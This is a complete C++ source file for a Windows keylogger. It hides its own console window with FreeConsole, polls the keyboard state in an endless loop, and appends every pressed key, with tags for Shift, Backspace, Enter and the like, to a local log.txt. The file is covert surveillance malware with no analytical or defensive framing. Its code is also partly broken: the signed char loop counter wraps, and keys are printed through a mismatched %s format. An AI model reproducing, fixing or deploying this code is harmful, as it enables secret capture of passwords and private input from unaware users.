// Ascii table https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html
// Virtual key code https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

#include<iostream>
#include<Windows.h>


using namespace std;

int Save(int _key , char *file);

int main()
{
    FreeConsole();
    char i;
    while(1)
    {
      Sleep(10);
        for(i = 8 ; i <= 255 ; i++) // relavent information starts at 8 or backspace
        {

            if(GetAsyncKeyState(i) == -32767) // button is pressed
            {
                Save(i , "log.txt");

            }

        }
    }
    return 0;
}

int Save(int _key , char *file)
{
    cout<<_key<<endl;
    FILE *OUTPUT_FILE;

    Sleep(10);
    OUTPUT_FILE = fopen(file , "a+");
    if(_key == VK_SHIFT)
    {
      fprintf(OUTPUT_FILE , "%s" , "[SHIFT]");
    }
    else if(_key == VK_BACK)
    {
      fprintf(OUTPUT_FILE , "%s" , "[BACK]");
    }
    else if(_key == VK_LBUTTON)
    {
      fprintf(OUTPUT_FILE , "%s" , "[LBUTTON]");
    }
    else if(_key == VK_RETURN)
    {
      fprintf(OUTPUT_FILE , "%s" , "[RETURN]");
    }
    else if(_key == VK_ESCAPE)
    {
      fprintf(OUTPUT_FILE , "%s" , "[ESCAPE]");
    }
    else
      fprintf(OUTPUT_FILE , "%s" , &_key);
    fclose(OUTPUT_FILE);

    return 0;

}
